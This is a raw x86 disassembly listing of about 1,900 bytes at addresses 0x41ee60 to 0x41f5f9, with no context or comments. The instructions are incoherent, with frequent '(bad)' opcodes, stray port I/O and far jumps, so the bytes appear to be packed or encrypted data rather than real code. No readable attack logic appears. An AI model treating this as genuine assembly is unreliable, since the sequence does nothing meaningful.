  41ee60:	loop   0x41ee00
  41ee62:	rcr    DWORD PTR [ecx],0xf1
  41ee65:	and    dl,dh
  41ee67:	popf   
  41ee68:	in     al,dx
  41ee69:	cmp    DWORD PTR [ecx+0x2ff79a8c],ecx
  41ee6f:	call   FWORD PTR [edx-0x346081f5]
  41ee75:	scas   eax,DWORD PTR es:[edi]
  41ee76:	addr16 jmp 0xe192:0xa9d2ae44
  41ee7e:	loop   0x41ee59
  41ee80:	jns    0x41ee08
  41ee82:	mov    ch,0x6c
  41ee84:	rcr    ecx,cl
  41ee86:	arpl   WORD PTR [edx+0xe],di
  41ee89:	lods   al,BYTE PTR ds:[esi]
  41ee8a:	inc    esi
  41ee8b:	push   0xfffffff9
  41ee8d:	imul   esp,DWORD PTR [edi],0xd
  41ee90:	jo     0x41ee36
  41ee92:	sub    DWORD PTR [eax+0x21f02e29],ecx
  41ee98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee9a:	push   edx
  41ee9b:	scas   al,BYTE PTR es:[edi]
  41ee9c:	mov    dl,0xcb
  41ee9e:	xor    eax,0x35ae66c3
  41eea3:	add    eax,0xacb4db6e
  41eea8:	push   ss
  41eea9:	ret    
  41eeaa:	jne    0x41ef05
  41eeac:	js     0x41eeb7
  41eeae:	pop    eax
  41eeaf:	dec    edi
  41eeb0:	cmp    BYTE PTR [eax+0x149a060b],0xfa
  41eeb7:	ret    0x820f
  41eeba:	popa   
  41eebb:	stos   BYTE PTR es:[edi],al
  41eebc:	jl     0x41eef3
  41eebe:	add    eax,0x9095c8c6
  41eec3:	mov    eax,0xf17104c1
  41eec8:	mov    edi,0xa8606d13
  41eecd:	mov    esp,0x197c5203
  41eed2:	not    DWORD PTR ds:[ecx+0x61fb19bb]
  41eed9:	(bad)  
  41eeda:	ret    
  41eedb:	in     eax,dx
  41eedc:	jge    0x41ee6b
  41eede:	inc    esi
  41eedf:	loop   0x41ef5f
  41eee1:	add    BYTE PTR [edi-0x36],dl
  41eee4:	rcl    BYTE PTR [eax-0x15],0xe4
  41eee8:	mov    BYTE PTR [edi+0x2a],cl
  41eeeb:	jmp    0x41ee6e
  41eeed:	and    ebx,DWORD PTR [edx+0x4c]
  41eef0:	jb     0x41eed0
  41eef2:	adc    esi,DWORD PTR [esi]
  41eef4:	adc    DWORD PTR ds:0x5b1d66a6,ecx
  41eefa:	ja     0x41ef3c
  41eefc:	mov    edi,0xec45792d
  41ef01:	icebp  
  41ef02:	mov    eax,ds:0xa4610557
  41ef07:	inc    edi
  41ef08:	pop    eax
  41ef09:	mov    WORD PTR [edi],ds
  41ef0b:	inc    ebp
  41ef0c:	and    BYTE PTR [edi+ebp*1-0xc],ch
  41ef10:	sbb    eax,0x33596499
  41ef15:	xchg   ebp,eax
  41ef16:	shr    BYTE PTR [ebp-0x51],cl
  41ef19:	jns    0x41ef4c
  41ef1b:	add    ah,al
  41ef1d:	adc    BYTE PTR [edi-0x59],dl
  41ef20:	add    BYTE PTR fs:[esi+ebx*2+0x6ec17316],cl
  41ef28:	and    eax,esi
  41ef2a:	push   0x2
  41ef2c:	add    edi,eax
  41ef2e:	push   esi
  41ef2f:	push   0x12
  41ef31:	mov    ds:0xa7004ca5,eax
  41ef36:	call   0xc4fe:0x5f64844f
  41ef3d:	mov    ds:0xe7efca6f,al
  41ef42:	inc    ecx
  41ef43:	cld    
  41ef44:	xchg   edx,eax
  41ef45:	out    dx,eax
  41ef46:	imul   edx,DWORD PTR [ebx],0xde8fbcd5
  41ef4c:	or     DWORD PTR [edi],ebp
  41ef4e:	lods   eax,DWORD PTR ds:[esi]
  41ef4f:	jns    0x41ef5d
  41ef51:	jno    0x41ef0a
  41ef53:	mov    edi,esi
  41ef55:	jmp    0xfdbc0377
  41ef5a:	adc    BYTE PTR [ebx-0xcd5cf93],bh
  41ef60:	js     0x41ef50
  41ef62:	pop    ds
  41ef63:	into   
  41ef64:	xor    eax,0x297583e7
  41ef69:	and    bh,ah
  41ef6b:	bound  ebx,QWORD PTR [edi+0x1ab30f52]
  41ef71:	aas    
  41ef72:	sub    ah,0x6
  41ef75:	or     esp,eax
  41ef77:	jp     0x41ef86
  41ef79:	xlat   BYTE PTR ds:[ebx]
  41ef7a:	retf   0xe2e5
  41ef7d:	ds in  eax,0x32
  41ef80:	jne    0x41ef9c
  41ef82:	push   ebx
  41ef83:	xchg   bh,cl
  41ef85:	hlt    
  41ef86:	clc    
  41ef87:	add    edi,DWORD PTR [edx]
  41ef89:	pop    edi
  41ef8a:	dec    ecx
  41ef8b:	add    DWORD PTR [edx+0x67],0xed72b03a
  41ef92:	in     al,0x6a
  41ef94:	lods   eax,DWORD PTR ds:[esi]
  41ef95:	inc    esp
  41ef96:	and    BYTE PTR [edi*2-0x622ed3ed],0x9d
  41ef9e:	xor    edi,ebp
  41efa0:	jmp    0x41ef38
  41efa2:	ret    0xde74
  41efa5:	sub    DWORD PTR [eax],0x7e008350
  41efab:	mov    ch,0xfb
  41efad:	ins    DWORD PTR es:[edi],dx
  41efae:	xor    dh,BYTE PTR [ebx+ecx*4-0x3d87369b]
  41efb5:	pop    ss
  41efb6:	mov    DWORD PTR [edx+0x13ce2f4f],ecx
  41efbc:	fmulp  st(4),st
  41efbe:	stos   BYTE PTR es:[edi],al
  41efbf:	fnstenv [edx]
  41efc1:	fcomip st,st(1)
  41efc3:	test   ecx,esi
  41efc5:	adc    edi,DWORD PTR [edx+0x8571f89]
  41efcb:	scas   eax,DWORD PTR es:[edi]
  41efcc:	call   DWORD PTR [edx+0x7d2b0174]
  41efd2:	das    
  41efd3:	xchg   edi,eax
  41efd4:	test   DWORD PTR [esi-0x79],ebx
  41efd7:	xchg   edx,eax
  41efd8:	mov    bl,bh
  41efda:	sub    eax,0x85ba48bf
  41efdf:	mov    cl,0x98
  41efe1:	mov    ds:0xe0848cfb,al
  41efe6:	cdq    
  41efe7:	add    eax,0xcc79d0d5
  41efec:	iret   
  41efed:	adc    BYTE PTR [ebp-0x512c936b],al
  41eff3:	(bad)  [ebx+0x3d2b189f]
  41eff9:	jbe    0x41f03d
  41effb:	shl    BYTE PTR [edi],cl
  41effd:	call   0x4dfa5a23
  41f002:	xchg   ecx,eax
  41f003:	and    DWORD PTR [edi+edi*8+0x7],esp
  41f007:	inc    ebp
  41f008:	cmp    BYTE PTR [eax],dl
  41f00a:	jecxz  0x41f06d
  41f00c:	out    0x3d,eax
  41f00e:	(bad)  
  41f00f:	ficomp WORD PTR [esi+0x5b]
  41f012:	push   edx
  41f013:	mov    bl,0xd6
  41f015:	mov    ch,0x75
  41f017:	inc    esi
  41f018:	jbe    0x41efb6
  41f01a:	jno    0x41f04b
  41f01c:	imul   ebp,esi,0xffffffd9
  41f01f:	shr    DWORD PTR [ebp-0x1b],1
  41f022:	add    BYTE PTR [ebp-0x3ffe7666],al
  41f028:	imul   DWORD PTR [eax]
  41f02a:	sbb    ah,BYTE PTR [edx+esi*8+0x5ca4793]
  41f031:	jae    0x41efc3
  41f033:	push   eax
  41f034:	sub    DWORD PTR [esi+ebp*4-0x27f18e03],0x23
  41f03c:	popf   
  41f03d:	(bad)  
  41f03e:	lods   eax,DWORD PTR ds:[esi]
  41f03f:	or     DWORD PTR [eax-0x5abb379d],esi
  41f045:	int    0x8a
  41f047:	inc    ebx
  41f048:	push   cs
  41f049:	jbe    0x41f016
  41f04b:	out    dx,al
  41f04c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f04d:	mov    eax,DWORD PTR [edi]
  41f04f:	add    al,0x48
  41f051:	leave  
  41f052:	mov    ds:0x3c276a46,eax
  41f057:	cmp    bh,BYTE PTR [edi+edx*8-0x52]
  41f05b:	test   eax,0x6de807f5
  41f060:	bound  ebx,QWORD PTR [eax+edx*8-0x65d4ba55]
  41f067:	stos   BYTE PTR es:[edi],al
  41f068:	pop    edx
  41f069:	out    0x14,al
  41f06b:	inc    edi
  41f06c:	push   esi
  41f06d:	push   cs
  41f06e:	(bad)  
  41f06f:	and    dl,bh
  41f071:	sub    al,0xed
  41f073:	inc    esi
  41f074:	call   0x62a7:0x7a92b499
  41f07b:	mov    BYTE PTR [ebx+ebx*8-0x6e],al
  41f07f:	ins    BYTE PTR es:[edi],dx
  41f080:	dec    ecx
  41f081:	loop   0x41f074
  41f083:	inc    eax
  41f084:	scas   al,BYTE PTR es:[edi]
  41f085:	aaa    
  41f086:	xchg   edx,eax
  41f087:	jg     0x41f069
  41f089:	cmp    esi,esp
  41f08b:	add    al,0x0
  41f08d:	pop    es
  41f08e:	and    DWORD PTR ds:0x47b1ef25,ebx
  41f094:	jbe    0x41f061
  41f096:	fimul  DWORD PTR [esi+0x8]
  41f099:	jl     0x41f111
  41f09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f09c:	xor    eax,0xe0ecc9f6
  41f0a1:	fidiv  WORD PTR [ebp-0x2ec475cf]
  41f0a7:	lods   eax,DWORD PTR ds:[esi]
  41f0a8:	mov    bl,0xef
  41f0aa:	in     al,0xd2
  41f0ac:	mov    bh,0x29
  41f0ae:	outs   dx,DWORD PTR ds:[esi]
  41f0af:	mov    ch,0x5a
  41f0b1:	ja     0x41f050
  41f0b3:	gs int 0xd7
  41f0b6:	ror    cl,0x8c
  41f0b9:	repz (bad) 
  41f0bb:	xor    BYTE PTR [eax],bh
  41f0bd:	leave  
  41f0be:	cli    
  41f0bf:	sub    eax,0x7fe91cb
  41f0c4:	xor    edx,DWORD PTR [edi+0x4b]
  41f0c7:	imul   ecx,DWORD PTR ds:0xdd206399,0xa0127c95
  41f0d1:	ror    BYTE PTR [ebp-0x1e4c0a3],1
  41f0d7:	shr    BYTE PTR [ebp-0x70],cl
  41f0da:	and    edi,DWORD PTR [edx+edx*1+0x72]
  41f0de:	xchg   esi,eax
  41f0df:	cmp    DWORD PTR [edi-0x22],eax
  41f0e2:	xor    BYTE PTR [ebp-0x4c],al
  41f0e5:	(bad)  
  41f0e6:	je     0x41f078
  41f0e8:	aad    0xa5
  41f0ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0eb:	jle    0x41f15e
  41f0ed:	mov    ah,0xd4
  41f0ef:	fnstenv [edx+edi*8]
  41f0f2:	lock dec edi
  41f0f4:	inc    ebp
  41f0f5:	cmp    DWORD PTR [eax],esi
  41f0f7:	adc    eax,0x67fdc430
  41f0fc:	inc    esi
  41f0fd:	es loopne 0x41f132
  41f100:	stos   BYTE PTR es:[edi],al
  41f101:	repnz imul edx,DWORD PTR [ebx+edx*4],0xa21afc03
  41f109:	xor    DWORD PTR [ebp-0x53ecab0e],0xf45128d3
  41f113:	sub    eax,0x76b90d41
  41f118:	add    DWORD PTR [ebx-0x25b9dd9a],esi
  41f11e:	std    
  41f11f:	cld    
  41f120:	add    DWORD PTR [edx],eax
  41f122:	sahf   
  41f123:	dec    edx
  41f124:	inc    bp
  41f126:	inc    ebp
  41f127:	xor    ch,cl
  41f129:	or     bl,BYTE PTR [esi+0x45]
  41f12c:	mov    ds:0xd3055260,al
  41f131:	or     eax,0xd7ad8efe
  41f136:	add    eax,0xe226eec4
  41f13b:	jne    0x41f0de
  41f13d:	(bad)  
  41f13e:	repnz push eax
  41f140:	cmp    eax,0x88522de8
  41f145:	jg     0x41f0e5
  41f147:	cld    
  41f148:	imul   ebp,DWORD PTR [bx+di-0x7400],0x52
  41f14e:	aas    
  41f14f:	cdq    
  41f150:	outs   dx,BYTE PTR ds:[esi]
  41f151:	ja     0x41f191
  41f153:	sar    BYTE PTR [ebx-0x3a847f86],1
  41f159:	inc    ebp
  41f15a:	or     dl,BYTE PTR [esi+0x11ea911f]
  41f160:	adc    al,BYTE PTR [ebx]
  41f162:	jp     0x41f1da
  41f164:	outs   dx,DWORD PTR ds:[esi]
  41f165:	fidivr WORD PTR [eax]
  41f167:	push   cs
  41f168:	xor    eax,0x59aa7c46
  41f16d:	data16 (bad) 
  41f170:	outs   dx,DWORD PTR ds:[esi]
  41f171:	adc    eax,0x775af077
  41f176:	das    
  41f177:	shl    BYTE PTR [edx-0x1f1377c8],cl
  41f17d:	bound  edi,QWORD PTR [ebp-0xb733266]
  41f183:	xchg   BYTE PTR [ecx],dh
  41f185:	in     al,0xd0
  41f187:	iret   
  41f188:	sub    DWORD PTR [ecx+ecx*8],ebx
  41f18b:	(bad)  
  41f18c:	adc    BYTE PTR [ecx-0x2f326e2e],ah
  41f192:	add    BYTE PTR [edx],cl
  41f194:	pushf  
  41f195:	xchg   ebp,eax
  41f196:	lea    edi,[eax-0x4c0519f5]
  41f19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f19d:	sub    BYTE PTR [esi],bh
  41f19f:	daa    
  41f1a0:	(bad)  
  41f1a1:	in     al,dx
  41f1a2:	fild   QWORD PTR [ebx-0x5dda8cdf]
  41f1a8:	test   eax,0xd29d751c
  41f1ad:	mov    eax,0x497b4277
  41f1b2:	bswap  esi
  41f1b4:	(bad)  
  41f1b5:	aad    0xc
  41f1b7:	inc    edx
  41f1b8:	xor    DWORD PTR ds:[edx-0x725980a9],esp
  41f1bf:	rol    BYTE PTR [edi],cl
  41f1c1:	xchg   edi,eax
  41f1c2:	or     al,0x9d
  41f1c4:	adc    dl,dh
  41f1c6:	jmp    0x1f87:0xcf54e2b7
  41f1cd:	xchg   ebp,eax
  41f1ce:	outs   dx,DWORD PTR ds:[esi]
  41f1cf:	sub    al,0x13
  41f1d1:	xor    DWORD PTR [esi+0x1b],ecx
  41f1d4:	ss aad 0x96
  41f1d7:	pop    esi
  41f1d8:	lods   eax,DWORD PTR ds:[esi]
  41f1d9:	jae    0x41f230
  41f1db:	push   0x68
  41f1dd:	add    ch,0x7c
  41f1e0:	ins    DWORD PTR es:[edi],dx
  41f1e1:	imul   edx,DWORD PTR [esi-0x2],0x29
  41f1e5:	or     esi,0xf90db674
  41f1eb:	out    dx,al
  41f1ec:	ret    0xec9f
  41f1ef:	mov    esi,0xfd0a8471
  41f1f4:	rcr    cl,cl
  41f1f6:	ja     0x41f270
  41f1f8:	mov    ebp,0xed3c9f54
  41f1fd:	mov    dh,0x88
  41f1ff:	sub    ebx,DWORD PTR [eax-0x70c95c1e]
  41f205:	mov    esi,0x40c35328
  41f20a:	repnz sahf 
  41f20c:	out    0xbc,eax
  41f20e:	in     al,dx
  41f20f:	and    eax,DWORD PTR [ecx+0x75620b17]
  41f215:	pop    ss
  41f216:	mov    dl,0xeb
  41f218:	push   edi
  41f219:	or     ebx,DWORD PTR [eax+0xa10dac2]
  41f21f:	cmp    al,0x3d
  41f221:	(bad)  
  41f222:	shl    DWORD PTR [edx+eiz*2-0x41],0x1c
  41f227:	or     ebx,edi
  41f229:	out    dx,al
  41f22a:	ror    DWORD PTR [ecx],cl
  41f22c:	and    eax,0xfc692315
  41f231:	mov    al,0x5
  41f233:	out    dx,al
  41f234:	mov    ecx,0x3ae8e5bd
  41f239:	pop    ebp
  41f23a:	mov    DWORD PTR [edi+eax*4],ebx
  41f23d:	cwde   
  41f23e:	jnp    0x41f277
  41f240:	cwde   
  41f241:	pop    edi
  41f242:	jae    0x41f27a
  41f244:	push   ecx
  41f245:	dec    ebx
  41f246:	rol    BYTE PTR [esi+0x52],1
  41f249:	pop    eax
  41f24a:	lds    ecx,FWORD PTR [edx]
  41f24c:	pop    ebp
  41f24d:	inc    ebp
  41f24e:	add    edx,ebp
  41f250:	cmp    bh,BYTE PTR [ebp+0x75]
  41f253:	out    dx,eax
  41f254:	dec    edx
  41f255:	xor    DWORD PTR [esi],esp
  41f257:	jge    0x41f2ad
  41f259:	jae    0x41f225
  41f25b:	(bad)  
  41f25c:	out    dx,eax
  41f25d:	fs out 0xee,al
  41f260:	mov    WORD PTR [ecx-0x4b944887],ss
  41f266:	js     0x41f224
  41f268:	cmp    eax,DWORD PTR [eax]
  41f26a:	in     eax,0x5b
  41f26c:	int    0x45
  41f26e:	pop    ecx
  41f26f:	jbe    0x41f2ee
  41f271:	mov    edx,0x1038038e
  41f276:	xchg   ebp,eax
  41f277:	dec    ecx
  41f278:	pop    ecx
  41f279:	mov    ds:0xc2f360f7,eax
  41f27e:	xchg   DWORD PTR [edx+0x20],ecx
  41f281:	shl    DWORD PTR [ebx],1
  41f283:	push   es
  41f284:	sub    ch,al
  41f286:	push   cs
  41f287:	jne    0x41f263
  41f289:	cmp    BYTE PTR [edx-0x65],ch
  41f28c:	retf   
  41f28d:	and    eax,0x3efdd3e8
  41f292:	add    dl,BYTE PTR [edi]
  41f294:	popa   
  41f295:	lea    esp,[edi+0x6c45c1a5]
  41f29b:	fsubr  st(7),st
  41f29d:	fld    TBYTE PTR ds:0xbdc7e48e
  41f2a3:	and    DWORD PTR [esi],ecx
  41f2a5:	idiv   DWORD PTR [ebx]
  41f2a7:	mov    gs,WORD PTR [edx-0x636d13e2]
  41f2ad:	mov    ebp,0x991c5514
  41f2b2:	push   ss
  41f2b3:	test   DWORD PTR ds:[eax],esp
  41f2b6:	(bad)  
  41f2b7:	push   edx
  41f2b8:	xor    edi,DWORD PTR [ecx-0x78]
  41f2bb:	jle    0x41f2d0
  41f2bd:	jae    0x41f291
  41f2bf:	ins    DWORD PTR es:[edi],dx
  41f2c0:	or     al,BYTE PTR [ebp+0x411709ae]
  41f2c6:	mov    edi,0x73ee87ec
  41f2cb:	mov    ebx,0x3c7d02b6
  41f2d0:	inc    ebp
  41f2d1:	xor    eax,0xf9c900ad
  41f2d6:	enter  0xcc9d,0xee
  41f2da:	(bad)  [ebx-0x4b2d63e0]
  41f2e0:	and    al,0x1c
  41f2e2:	push   edx
  41f2e3:	xor    al,0xf6
  41f2e5:	jae    0x41f30c
  41f2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2e8:	sbb    edx,DWORD PTR [ecx+0x29]
  41f2eb:	clc    
  41f2ec:	neg    BYTE PTR [ebx-0x5fec5630]
  41f2f2:	push   eax
  41f2f3:	mov    eax,ds:0xbcf7bc9
  41f2f8:	jb     0x41f2df
  41f2fa:	lds    ecx,FWORD PTR [edx-0x62]
  41f2fd:	xchg   edi,eax
  41f2fe:	push   esi
  41f2ff:	dec    ebx
  41f300:	mov    ebp,0x6bf605a9
  41f305:	mov    ebp,0xddf0a907
  41f30a:	ds loopne 0x41f318
  41f30d:	mul    bl
  41f30f:	shr    ch,1
  41f311:	sbb    DWORD PTR [esi],ecx
  41f313:	xor    ch,bh
  41f315:	cmp    DWORD PTR [esi],esi
  41f317:	test   al,0x44
  41f319:	sub    eax,0x5068c7a7
  41f31e:	xor    eax,0xd7a20467
  41f323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f324:	scas   al,BYTE PTR es:[edi]
  41f325:	rcl    dl,1
  41f327:	pop    esp
  41f328:	fnstcw WORD PTR [ebx+0x7d3421f6]
  41f32e:	ror    DWORD PTR [eax+0x37f56897],1
  41f334:	xchg   esi,eax
  41f335:	xor    dl,BYTE PTR [esi]
  41f337:	(bad)  
  41f338:	pop    ds
  41f339:	sti    
  41f33a:	xor    DWORD PTR ds:0x5e1cba77,esi
  41f340:	and    ebp,esp
  41f342:	cmp    ebp,ebx
  41f344:	nop
  41f345:	mov    eax,0x4d25c6c6
  41f34a:	enter  0x50fe,0x47
  41f34e:	out    dx,al
  41f34f:	jl     0x41f33c
  41f351:	sub    eax,0x4157041f
  41f356:	les    edi,FWORD PTR [esi+0x5edf7f99]
  41f35c:	inc    edi
  41f35d:	ja     0x41f397
  41f35f:	mov    ds:0x420c86e1,eax
  41f364:	retf   
  41f365:	dec    ebx
  41f366:	mov    dh,0x6f
  41f368:	sbb    al,0xd5
  41f36a:	sub    dh,BYTE PTR [eax]
  41f36c:	jmp    DWORD PTR [ecx-0x36]
  41f36f:	sbb    dl,dl
  41f371:	retf   
  41f372:	push   ebx
  41f373:	sar    ebp,1
  41f375:	add    eax,0x69e10ae7
  41f37a:	mov    ds:0xd986c904,eax
  41f37f:	fcomp  st(0)
  41f381:	cld    
  41f382:	pop    esi
  41f383:	mov    ebx,0xaf67a30b
  41f388:	and    DWORD PTR ds:0x536ebc15,edi
  41f38e:	(bad)  
  41f38f:	xor    eax,0xa8473473
  41f394:	jg     0x41f318
  41f396:	dec    esi
  41f397:	mov    dl,BYTE PTR [esi-0x701ac1ca]
  41f39d:	jo     0x41f394
  41f39f:	mov    ch,0xef
  41f3a1:	into   
  41f3a2:	xor    BYTE PTR [esi-0x5607834],ah
  41f3a8:	loope  0x41f3a6
  41f3aa:	fld    DWORD PTR [edi-0x398cb5a2]
  41f3b0:	lahf   
  41f3b1:	(bad)  
  41f3b2:	outs   dx,BYTE PTR ds:[esi]
  41f3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b4:	out    dx,eax
  41f3b5:	arpl   WORD PTR fs:[edi],sp
  41f3b8:	mov    fs,WORD PTR [edi+0x3dd1ae9d]
  41f3be:	push   cs
  41f3bf:	xor    ah,BYTE PTR [esi-0x69]
  41f3c2:	stos   DWORD PTR es:[edi],eax
  41f3c3:	jbe    0x41f367
  41f3c5:	out    dx,eax
  41f3c6:	fs add eax,0x820ed190
  41f3cc:	mov    ebp,DWORD PTR [esi+edi*4-0x1a35b0fd]
  41f3d3:	or     BYTE PTR ds:0xe86eaf2d,cl
  41f3d9:	mov    ah,BYTE PTR [edi-0x456d4026]
  41f3df:	mov    bh,0xc3
  41f3e1:	jl     0x41f447
  41f3e3:	into   
  41f3e4:	mov    dh,0x81
  41f3e6:	adc    edi,ebp
  41f3e8:	push   ebx
  41f3e9:	adc    eax,0x4cb79d5
  41f3ee:	int3   
  41f3ef:	sbb    esp,DWORD PTR [ebp+0x6a]
  41f3f2:	aad    0xb5
  41f3f4:	repz mov eax,0x24738989
  41f3fa:	hlt    
  41f3fb:	or     eax,0xa2871961
  41f400:	mov    al,0xb9
  41f402:	sub    DWORD PTR [ebp+0x349bb6a1],eax
  41f408:	or     dl,BYTE PTR [ecx]
  41f40a:	out    0x3f,al
  41f40c:	cmp    cl,BYTE PTR [ebp+edx*1-0x4]
  41f410:	adc    al,0x99
  41f412:	mov    cl,0xfb
  41f414:	pop    edx
  41f415:	push   esp
  41f416:	pop    eax
  41f417:	enter  0x7a59,0xbd
  41f41b:	loope  0x41f45e
  41f41d:	inc    edx
  41f41e:	mov    bl,0xb0
  41f420:	lea    esi,[edi+0x4de03e68]
  41f426:	mov    edi,0x5b46c30
  41f42b:	jb     0x41f460
  41f42d:	jnp    0x41f426
  41f42f:	xor    al,0x4f
  41f431:	div    BYTE PTR [ebx+0x6d]
  41f434:	sub    al,0x2d
  41f436:	fst    DWORD PTR [esi+ecx*8+0x1dacc8ed]
  41f43d:	popa   
  41f43e:	pop    edi
  41f43f:	gs add eax,0x90a85256
  41f445:	ds dec esi
  41f447:	ss jnp 0x41f3f1
  41f44a:	clc    
  41f44b:	pop    ebp
  41f44c:	push   ebp
  41f44d:	cld    
  41f44e:	inc    edi
  41f44f:	lahf   
  41f450:	scas   al,BYTE PTR es:[edi]
  41f451:	mov    gs,WORD PTR [esi]
  41f453:	inc    edi
  41f454:	mov    esi,0x46a629ab
  41f459:	lods   al,BYTE PTR ds:[esi]
  41f45a:	sbb    dl,BYTE PTR [eax+eax*4+0x3ca46195]
  41f461:	mov    ah,0xba
  41f463:	test   eax,0x6296880a
  41f468:	mov    DWORD PTR ds:0xc3f09b4f,eax
  41f46e:	mov    ds:0xa73d2ab2,eax
  41f473:	cmc    
  41f474:	adc    eax,0xfad9a22a
  41f479:	jns    0x41f4d8
  41f47b:	xor    eax,0x4a3ee225
  41f480:	add    al,0x7e
  41f482:	or     esi,DWORD PTR [esi*8-0x5cfd20ed]
  41f489:	call   0x61c5b824
  41f48e:	xchg   esi,eax
  41f48f:	aaa    
  41f490:	pop    es
  41f491:	or     DWORD PTR [edx-0xd],edi
  41f494:	fnstcw WORD PTR [eax+0x5e6ef261]
  41f49a:	add    DWORD PTR [eax],edi
  41f49c:	and    esi,DWORD PTR [ecx]
  41f49e:	lods   eax,DWORD PTR ds:[esi]
  41f49f:	sahf   
  41f4a0:	aaa    
  41f4a1:	aad    0x83
  41f4a3:	dec    esp
  41f4a4:	fstp   TBYTE PTR [esi]
  41f4a6:	icebp  
  41f4a7:	outs   dx,BYTE PTR ds:[esi]
  41f4a8:	add    eax,0x1abc7362
  41f4ad:	in     eax,0xbb
  41f4af:	ins    BYTE PTR es:[edi],dx
  41f4b0:	test   DWORD PTR [ebx-0x70],edx
  41f4b3:	call   0x3740:0x73c7ef5a
  41f4ba:	call   0x82bc:0x9ffe97f1
  41f4c1:	test   eax,0x4cdf6dc0
  41f4c6:	mov    al,ds:0x59aea9f8
  41f4cb:	cdq    
  41f4cc:	cmp    al,0xd
  41f4ce:	(bad)  
  41f4d0:	xor    BYTE PTR [eax],bl
  41f4d2:	adc    ebp,edi
  41f4d4:	sbb    eax,0x1a5e6159
  41f4d9:	ins    BYTE PTR es:[edi],dx
  41f4da:	xchg   ebx,eax
  41f4db:	mov    esi,0x3e3e355c
  41f4e0:	cdq    
  41f4e1:	inc    edx
  41f4e2:	dec    ebp
  41f4e3:	dec    esi
  41f4e4:	adc    esp,esi
  41f4e6:	pop    esp
  41f4e7:	xlat   BYTE PTR ds:[ebx]
  41f4e8:	jge    0x41f495
  41f4ea:	push   0xdc4a9fb1
  41f4ef:	cmp    eax,0xd6b15ea3
  41f4f4:	mov    ebp,0xf6bfae74
  41f4f9:	les    ecx,FWORD PTR [eax-0x68]
  41f4fc:	aaa    
  41f4fd:	(bad)  
  41f4fe:	jmp    0x444d:0x50aef472
  41f505:	loopne 0x41f4aa
  41f507:	mov    dh,dl
  41f509:	test   BYTE PTR [edi],cl
  41f50b:	sub    DWORD PTR [eax+ebx*2],edx
  41f50e:	mov    cl,bl
  41f510:	adc    ecx,DWORD PTR [ebp+eax*2-0x62]
  41f514:	outs   dx,BYTE PTR ds:[esi]
  41f515:	push   es
  41f516:	in     al,0x9a
  41f518:	or     BYTE PTR [ebp+0x2b1f0b46],bl
  41f51e:	push   edx
  41f51f:	pusha  
  41f520:	adc    BYTE PTR [eax-0x13],cl
  41f523:	sub    eax,0x67070efe
  41f528:	aaa    
  41f529:	std    
  41f52a:	jne    0x41f57a
  41f52c:	ror    BYTE PTR [eax-0x32],0xf3
  41f530:	fs pop edx
  41f532:	xlat   BYTE PTR ds:[ebx]
  41f533:	lods   eax,DWORD PTR ds:[esi]
  41f534:	add    esi,DWORD PTR [edx-0xa]
  41f537:	in     eax,0x3a
  41f539:	sub    eax,0x1ce9d314
  41f53e:	pop    ss
  41f53f:	jmp    FWORD PTR [ebx+0x58]
  41f542:	sub    eax,0x967fc172
  41f547:	push   edx
  41f548:	mov    ah,0x6a
  41f54a:	(bad)  
  41f54b:	loopne 0x41f5cb
  41f54d:	ror    ah,cl
  41f54f:	inc    edx
  41f550:	stos   BYTE PTR es:[edi],al
  41f551:	int3   
  41f552:	lods   al,BYTE PTR ds:[esi]
  41f553:	mov    al,ds:0x4265cb2f
  41f558:	(bad)  
  41f559:	out    dx,eax
  41f55a:	js     0x41f544
  41f55c:	call   0xc73c01c8
  41f561:	repz ret 
  41f563:	push   edi
  41f564:	xor    BYTE PTR [edi+eiz*2],ah
  41f567:	adc    BYTE PTR [ebx-0x63],dh
  41f56a:	mov    bl,0xbf
  41f56c:	into   
  41f56d:	aam    0xaf
  41f56f:	dec    esp
  41f570:	pop    esp
  41f571:	pusha  
  41f572:	shl    BYTE PTR [ecx],cl
  41f574:	rcr    DWORD PTR [edx+0x30d0e27c],cl
  41f57a:	fwait
  41f57b:	push   cs
  41f57c:	call   0x62f3:0x42a0404a
  41f583:	rcl    ebx,cl
  41f585:	or     cl,ch
  41f587:	dec    ebx
  41f588:	sub    BYTE PTR [eax-0x56],al
  41f58b:	mov    ch,BYTE PTR [ebp-0x59d37b9c]
  41f591:	jmp    0xd113:0x82957f53
  41f598:	dec    ebx
  41f599:	push   ss
  41f59a:	dec    esp
  41f59b:	out    0x4d,al
  41f59d:	bound  edi,QWORD PTR [ecx+0x72]
  41f5a0:	or     DWORD PTR [edx],ebx
  41f5a2:	mov    ebp,0x47908ee0
  41f5a7:	ja     0x41f543
  41f5a9:	gs or  eax,0x493e09a4
  41f5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b0:	(bad)  
  41f5b1:	mov    bl,0x2a
  41f5b3:	inc    ebp
  41f5b4:	call   0x7af59c0b
  41f5b9:	mov    edx,0x55f94ba4
  41f5be:	sahf   
  41f5bf:	fmul   st(7),st
  41f5c1:	cs mov cl,0x36
  41f5c4:	retf   
  41f5c5:	je     0x41f5ef
  41f5c7:	sti    
  41f5c8:	adc    eax,0xed7f5599
  41f5cd:	rol    BYTE PTR ds:0xa1caff2e,cl
  41f5d3:	jmp    0xb2893fd6
  41f5d8:	jp     0x41f5ad
  41f5da:	push   ebx
  41f5db:	popa   
  41f5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5dd:	pop    edx
  41f5de:	popa   
  41f5df:	adc    al,0x43
  41f5e1:	bound  edi,QWORD PTR [ebp-0x1d]
  41f5e4:	adc    esp,DWORD PTR [esi]
  41f5e6:	push   ss
  41f5e7:	scas   al,BYTE PTR es:[edi]
  41f5e8:	into   
  41f5e9:	add    al,0xd1
  41f5eb:	sub    BYTE PTR [eax],bh
  41f5ed:	daa    
  41f5ee:	mov    cl,0x9e
  41f5f0:	sbb    BYTE PTR [edi-0x53],0x2c
  41f5f4:	mov    eax,ds:0x11eb9a4e
  41f5f9:	test   al,0x36
